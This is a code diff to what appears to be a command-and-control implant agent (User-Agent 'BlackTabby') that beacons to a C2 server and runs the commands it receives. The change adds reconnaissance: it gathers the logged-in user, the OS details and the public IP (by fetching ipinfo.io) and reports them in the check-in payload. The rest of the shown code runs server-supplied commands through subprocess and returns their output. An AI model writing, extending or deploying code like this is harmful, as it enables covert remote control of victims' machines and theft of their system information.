@@ -10,8 +10,12 @@ class Agent(object):
 
 	url = "https://127.0.0.1:9000/"
 	random_num = random.randint(100,90000)
+	user_result = subprocess.run(["whoami"],capture_output=True).stdout.decode("utf-8").rstrip()
+	os_result = subprocess.run(["uname","-a"],capture_output=True).stdout.decode("utf-8").rstrip()
+	ip_result = subprocess.run(["curl","ipinfo.io/ip"],capture_output=True).stdout.decode("utf-8").rstrip()
+	####
 	#payload = "{\"agent_id\": \"{}\",\n\t\"os\": \"Windows\",\n\t\"ip\": \"0.0.0.0\",\n\t\"user\": \"guest\",\n\t\"completed_commands\": [],\n\t\"pending_commands\": []\n}".format(random_num)
-	payload = {"agent_id":"{}".format(random_num),"os":"Windows","ip":"0.0.0.0","user":"guest","completed_commands":[],"pending_commands":[]}
+	payload = {"agent_id":"{}".format(random_num),"os":"{}".format(os_result),"ip":"{}".format(ip_result),"user":"{}".format(user_result),"completed_commands":[],"pending_commands":[]}
 	payload = json.dumps(payload)
 	headers = {
 	  'User-Agent': 'QmxhY2tUYWJieQo=',
@@ -47,7 +51,7 @@ class Agent(object):
 			cmd_split = self.cmd.split(" ")
 			try:
 				result = subprocess.run(cmd_split,capture_output=True)
-				self.cmd_result = {self.cmd:result.stdout.decode("utf-8")}
+				self.cmd_result = {self.cmd:result.stdout.decode("utf-8").rstrip()}
 				try:
 					### Requesting new token ###
 					refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
